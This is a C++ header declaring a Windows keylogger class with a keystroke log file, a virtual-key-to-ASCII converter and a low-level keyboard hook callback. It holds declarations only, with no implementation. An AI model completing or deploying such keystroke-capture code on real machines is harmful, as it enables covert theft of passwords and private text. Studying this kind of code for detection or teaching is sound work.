#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <fstream>

class Keylogger {
public:
    static std::ofstream kblog;

    Keylogger();
    ~Keylogger();

    static char vk2ascii(UINT vkCode);
    static LRESULT CALLBACK KBHook(int code, WPARAM wParam, LPARAM lParam);
};